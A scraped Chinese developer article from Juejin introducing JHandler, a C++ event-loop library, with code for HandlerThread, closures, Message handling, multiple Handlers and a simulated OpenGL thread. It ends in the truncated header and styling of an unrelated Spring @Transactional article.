<meta itemprop="datePublished" content="2025-11-23T04:52:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="江澎涌"/> <meta itemprop="url" content="https://juejin.cn/user/1820446986338504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JHandler——一套简单易用的 C++ 事件循环机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1820446986338504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    江澎涌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:52:34.000Z" title="Sun Nov 23 2025 04:52:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">零、JHandler</h2>
<p><strong>JHandler 是一套 C++ 的事件循环机制。</strong> 可在自行创建的线程中使用，也可以使用 JHandler 已封装好的独立线程处理事件。</p>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FzincPower%2FJHandler" target="_blank" title="https://github.com/zincPower/JHandler" ref="nofollow noopener noreferrer">github.com/zincPower/J…</a></p>
<h2 data-id="heading-1">一、集成</h2>
<p>将项目中 <code>jhandler</code> 文件夹拷贝添加到项目中，并在项目的 <code>CMakeLists.txt</code> 中添加以下配置即可：</p>
<pre><code class="hljs language-cmake" lang="cmake">include_directories(“添加的 jhandler 目录相对于当前 CMakeLists.txt 文件的路径”/jhandler/include)
add_subdirectory(jhandler)

target_link_libraries(“链接目标名称” PUBLIC jhandler)
</code></pre>
<h2 data-id="heading-2">二、常规使用</h2>
<h3 data-id="heading-3">1、使用 JHandler 自带的线程</h3>
<p><code>JHandler</code> 中已经准备好了 <code>HandlerThread</code> ，<strong>内部会在调用 <code>start</code> 方法后创建独立线程</strong>，按照放入消息和闭包的顺序，串行分发事件消息或执行闭包。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 创建 HandlerThread</span>
<span class="hljs-keyword">auto</span> handlerThread = jhandler::HandlerThread::<span class="hljs-built_in">create</span>();
<span class="hljs-comment">// 启动 HandlerThread ，内部会启动线程</span>
handlerThread-&gt;<span class="hljs-built_in">start</span>();

<span class="hljs-comment">// 对 HandlerThread 进行使用</span>

<span class="hljs-comment">// 退出 HandlerThread ，会执行完已经放入的事件消息和闭包</span>
handlerThread-&gt;<span class="hljs-built_in">quit</span>();
</code></pre>
<p><strong><code>quit</code> 方法不会阻塞当前线程，会让 <code>HandlerThread</code> 内部线程在处理完所有的消息和闭包后关闭线程。</strong></p>
<h3 data-id="heading-4">2、添加事件消息、闭包</h3>
<p>启动 <code>HandlerThread</code> 后，可以放入<strong>闭包</strong>或<strong>事件消息 <code>Message</code></strong> 。</p>
<p><strong>闭包：</strong> 调用 <code>Handler-&gt;post(std::function&lt;void()&gt; fun)</code> 方法放入闭包，具体下所示：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">auto</span> name = <span class="hljs-string">"江澎涌"</span>;
handler-&gt;<span class="hljs-built_in">post</span>([name]() {
jhandler::Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"【runClosure】运行闭包 name="</span>, name, <span class="hljs-string">" Looper 线程 id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
});

<span class="hljs-comment">// 输出</span>
<span class="hljs-comment">// 【CommonUse】 【runClosure】运行闭包 name=江澎涌 Looper 线程 id=0x700000339000</span>
</code></pre>
<p><strong>事件消息 Message：</strong> 调用 <code>Handler-&gt;sendMessage(std::unique_ptr&lt;Message&gt; message)</code> 方法放入事件消息。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">auto</span> message = jhandler::Message::<span class="hljs-built_in">obtain</span>();             <span class="hljs-comment">// 获取事件消息</span>
message-&gt;what = SAY_HI;                                 <span class="hljs-comment">// 事件类别</span>
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"江澎涌"</span>); <span class="hljs-comment">// 事件数据</span>
message-&gt;arg1 = <span class="hljs-number">1994</span>;
message-&gt;arg2 = <span class="hljs-number">170</span>;
handler-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));               <span class="hljs-comment">// 放入事件消息</span>

<span class="hljs-comment">// 输出</span>
<span class="hljs-comment">// 【FirstCommonUseHandler】 【handleMessage】你好，江澎涌(1994,170) Looper 线程 id=0x70000589c000</span>
</code></pre>
<blockquote>
<p>如何处理事件消息，请查看 <strong>“自定义事件处理的 Handler”</strong> 小节。</p>
</blockquote>
<h3 data-id="heading-5">3、移除消息</h3>
<p>可以通过 <code>Handler-&gt;removeMessage(int32_t what)</code> 移除与 <code>what</code> 相同的事件消息。</p>
<pre><code class="hljs language-cpp" lang="cpp">handler-&gt;<span class="hljs-built_in">removeMessage</span>(SAY_HI);
</code></pre>
<p>可以通过 <code>Handler-&gt;removeAllMessages()</code> 移除所有的闭包和事件消息。</p>
<pre><code class="hljs language-cpp" lang="cpp">handler-&gt;<span class="hljs-built_in">removeAllMessages</span>();
</code></pre>
<h3 data-id="heading-6">4、定义处理事件消息的 Handler</h3>
<p>放入的事件消息，需要开发者继承 <code>jhandler::Handler</code> 编写自定义事件处理的 <code>Handler</code> 进行接收处理。</p>
<p>在重写的 <code>handleMessage</code> 方法中接收放入的事件消息，编写相应业务的逻辑。具体编写如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 定义事件消息 what</span>
<span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> SAY_HI = <span class="hljs-number">10000</span>;

<span class="hljs-comment">// 定义 Handler</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FirstCommonUseHandler</span> : <span class="hljs-keyword">public</span> jhandler::Handler {
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">static</span> std::string TAG;
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">FirstCommonUseHandler</span><span class="hljs-params">(std::shared_ptr&lt;jhandler::Looper&gt; looper)</span> </span>{}
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">handleMessage</span><span class="hljs-params">(<span class="hljs-type">const</span> std::unique_ptr&lt;jhandler::Message&gt; &amp;message)</span> <span class="hljs-keyword">override</span></span>{
        <span class="hljs-comment">// 此处接收 Message 编写自己的业务逻辑</span>
        <span class="hljs-keyword">switch</span> (message-&gt;what) {
            <span class="hljs-keyword">case</span> SAY_HI: {
                <span class="hljs-keyword">auto</span> name = message-&gt;<span class="hljs-built_in">getData</span>&lt;std::string&gt;();
                <span class="hljs-keyword">auto</span> year = message-&gt;arg1;
                <span class="hljs-keyword">auto</span> height = message-&gt;arg2;
                Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"【handleMessage】你好，"</span>, *name, <span class="hljs-string">"("</span>, year, <span class="hljs-string">","</span>, height, <span class="hljs-string">")"</span>, <span class="hljs-string">" Looper 线程 id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
                <span class="hljs-keyword">break</span>;
            }
            <span class="hljs-keyword">case</span> SHOW_DESCRIPTION: {
                Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"【handleMessage】我是一个 C++ 事件循环机制 Looper 线程 id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
                <span class="hljs-keyword">break</span>;
            }
        }
    }
};

<span class="hljs-comment">// 创建 HandlerThread</span>
<span class="hljs-keyword">auto</span> handlerThread = jhandler::HandlerThread::<span class="hljs-built_in">create</span>();
<span class="hljs-comment">// 启动 HandlerThread</span>
handlerThread-&gt;<span class="hljs-built_in">start</span>();
<span class="hljs-comment">// 获取 Looper</span>
<span class="hljs-keyword">auto</span> looper = handlerThread-&gt;<span class="hljs-built_in">getLooper</span>();
<span class="hljs-comment">// 创建自己的 Handler</span>
<span class="hljs-keyword">auto</span> handler = std::<span class="hljs-built_in">make_shared</span>&lt;FirstCommonUseHandler&gt;(looper);
<span class="hljs-comment">// 事件消息传递</span>
<span class="hljs-keyword">auto</span> message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SAY_HI;
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"江澎涌"</span>);
message-&gt;arg1 = <span class="hljs-number">1994</span>;
message-&gt;arg2 = <span class="hljs-number">170</span>;
handler-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SHOW_DESCRIPTION;
handler-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

<span class="hljs-comment">// 输出 </span>
<span class="hljs-comment">// 【FirstCommonUseHandler】 【handleMessage】你好，江澎涌(1994,170) Looper 线程 id=0x70000589c000</span>
<span class="hljs-comment">// 【FirstCommonUseHandler】 【handleMessage】我是一个 C++ 事件循环机制 Looper 线程 id=0x70000589c000</span>
</code></pre>
<h3 data-id="heading-7">5、多个 Handler 解耦逻辑</h3>
<p>有时需要将处理事件消息的逻辑解耦，可以考虑通过 <code>Looper</code> 创建多个 <code>Handler</code> ，将事件消息发送到对应的 <code>Handler</code> ，后续会由该 <code>Handler</code> 执行对应逻辑，并且<strong>多个 <code>Handler</code> 都是运行在同一个线程中，按添加顺序进行执行。</strong></p>
<p>具体编写如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">auto</span> handlerThread = jhandler::HandlerThread::<span class="hljs-built_in">create</span>();
handlerThread-&gt;<span class="hljs-built_in">start</span>();

<span class="hljs-keyword">auto</span> looper = handlerThread-&gt;<span class="hljs-built_in">getLooper</span>();
<span class="hljs-comment">// 创建两个 Handler</span>
<span class="hljs-keyword">auto</span> handler1 = std::<span class="hljs-built_in">make_shared</span>&lt;FirstCommonUseHandler&gt;(looper);
<span class="hljs-keyword">auto</span> handler2 = std::<span class="hljs-built_in">make_shared</span>&lt;SecondCommonUseHandler&gt;(looper);

<span class="hljs-comment">// 向 handler1 发送 SAY_HI 类型的 message ，由 handler1 进行处理 </span>
<span class="hljs-keyword">auto</span> message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SAY_HI;
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"江澎涌"</span>);
message-&gt;arg1 = <span class="hljs-number">1994</span>;
message-&gt;arg2 = <span class="hljs-number">170</span>;
handler1-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

<span class="hljs-comment">// 向 handler2 发送 SAY_HI 类型的 message ，由 handler2 进行处理 </span>
message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SAY_HI;
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"jiang peng yong"</span>);
message-&gt;arg1 = <span class="hljs-number">2025</span>;
message-&gt;arg2 = <span class="hljs-number">100</span>;
handler2-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

<span class="hljs-comment">// 会看到以下输出，虽然是同一类型消息，但由不同 Handler 进行处理，并且线程是相同的且按顺序执行</span>
<span class="hljs-comment">//【FirstCommonUseHandler】 【handleMessage】你好，江澎涌(1994,170) Looper 线程 id=0x700009ae3000</span>
<span class="hljs-comment">//【SecondCommonUseHandler】 【handleMessage】hello, jiang peng yong(2025,100) Looper 线程 id=0x700009ae3000</span>
</code></pre>
<blockquote>
<p><code>FirstCommonUseHandler</code> 和 <code>SecondCommonUseHandler</code> 请查看源码不再赘述。</p>
</blockquote>
<h2 data-id="heading-8">三、自定义线程中使用 JHandler</h2>
<p>有些情况下，需要在自己的线程中使用事件循环机制，所以 JHandler 也支持在自定义线程中增加事件循环机制。</p>
<p>例如在鸿蒙中，需要封装一个 OpenGL 线程给到相机使用，OpenGL 是线程相关的，需要一个事件循环不断的处理每一帧数据，同时处理好 Surface 、滤镜等数据。以下便是一个 OpenGL 的模拟样例：</p>
<blockquote>
<p>完整代码可以查看 <code>thread_use.cpp</code></p>
</blockquote>
<p><strong>在自定义线程中，按照如下步骤进行：</strong></p>
<ol>
<li>增加 egl 的创建，通过 <code>jhandler::Looper::create()</code> 创建 <code>Looper</code> ，然后创建内部的 Handler 用于处理后续的相机帧、滤镜管理等。</li>
<li>调用 <code>Looper::loop()</code> 方法，进入事件循环，直到外部调用 <code>Looper::quit()</code> 终止事件循环。</li>
<li>释放和回收 egl 相关资源。</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GLThread::loop</span><span class="hljs-params">(<span class="hljs-type">const</span> std::shared_ptr&lt;GLThread&gt; &amp;glThread)</span> </span>{
    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 进入 GLThread 启动 GL 逻辑 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 模拟创建 EGL 相关环境 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
    <span class="hljs-comment">// 睡眠了 500 毫秒，模拟创建 EGL</span>
    std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">milliseconds</span>(<span class="hljs-number">500</span>));

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 进入事件循环 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
    glThread-&gt;mLooper-&gt;<span class="hljs-built_in">loop</span>();
    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 退出事件循环 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 开始释放资源 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 释放 EGL ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 释放 Handler ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
    glThread-&gt;mHandler-&gt;<span class="hljs-built_in">removeAllMessages</span>();
    glThread-&gt;mHandler = <span class="hljs-literal">nullptr</span>;

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"释放 Looper"</span>);
    glThread-&gt;mLooper = <span class="hljs-literal">nullptr</span>;
    <span class="hljs-built_in">quitLoop</span>(glThread);
    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 退出 GLThread 线程 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
}
</code></pre>
<p>同样也支持多个 Handler 解耦逻辑，通过获取内部的 <code>Looper</code> 创建对应的 <code>Handler</code> 即可。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">threadUse</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">auto</span> glThread = std::<span class="hljs-built_in">make_shared</span>&lt;GLThread&gt;();
    glThread-&gt;<span class="hljs-built_in">start</span>();

    <span class="hljs-comment">// 创建业务需要的 handler ，可以不耦合 gl 的相关流程</span>
    <span class="hljs-keyword">auto</span> businessHandler = std::<span class="hljs-built_in">make_shared</span>&lt;BusinessHandler&gt;(glThread-&gt;<span class="hljs-built_in">getLooper</span>());
    businessHandler-&gt;<span class="hljs-built_in">sayHello</span>();

    <span class="hljs-keyword">auto</span> glHandler = glThread-&gt;<span class="hljs-built_in">getHandler</span>();
    glHandler-&gt;<span class="hljs-built_in">addFilter</span>();
    glHandler-&gt;<span class="hljs-built_in">requestRender</span>();
    glHandler-&gt;<span class="hljs-built_in">removeFilter</span>();

    businessHandler-&gt;<span class="hljs-built_in">sayHello</span>();

    glThread-&gt;<span class="hljs-built_in">quit</span>();

    <span class="hljs-comment">// 为了让内部执行外，才结束整个项目运行。</span>
    std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">seconds</span>(<span class="hljs-number">1</span>));
    
    <span class="hljs-comment">// 输出</span>
    <span class="hljs-comment">// 【GLHandler】 添加滤镜 filterName=0x600002314048 thread id=0x700009ae3000</span>
    <span class="hljs-comment">// 【GLHandler】 进行渲染 thread id=0x700009ae3000</span>
    <span class="hljs-comment">// 【GLHandler】 移除滤镜 filterName=0x600002314078 thread id=0x700009ae3000</span>
    <span class="hljs-comment">// 【BusinessHandler】 你好 thread id=0x700009ae3000</span>
}
</code></pre>
<h2 data-id="heading-9">四、作者简介</h2>
<p>掘金：<a href="https://juejin.im/user/5c3033ef51882524ec3a88ba/posts" target="_blank" title="https://juejin.im/user/5c3033ef51882524ec3a88ba/posts">juejin.im/user/5c3033…</a></p>
<p>csdn：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fweixin_37625173" target="_blank" title="https://blog.csdn.net/weixin_37625173" ref="nofollow noopener noreferrer">blog.csdn.net/weixin_3762…</a></p>
<p>公众号：微信搜索 "江澎涌"</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[@Transactional做不到的5件事，我用这6种方法解决了]]></title>    <link>https://juejin.cn/post/7575104251866398730</link>    <guid>https://juejin.cn/post/7575104251866398730</guid>    <pubDate>2025-11-23T02:52:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251866398730" data-draft-id="7575133880435753011" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="@Transactional做不到的5件事，我用这6种方法解决了"/> <meta itemprop="keywords" content="Spring Boot,后端,面试"/> <meta itemprop="datePublished" content="2025-11-23T02:52:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            @Transactional做不到的5件事，我用这6种方法解决了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T02:52:00.000Z" title="Sun Nov 23 2025 02:52:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    37
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 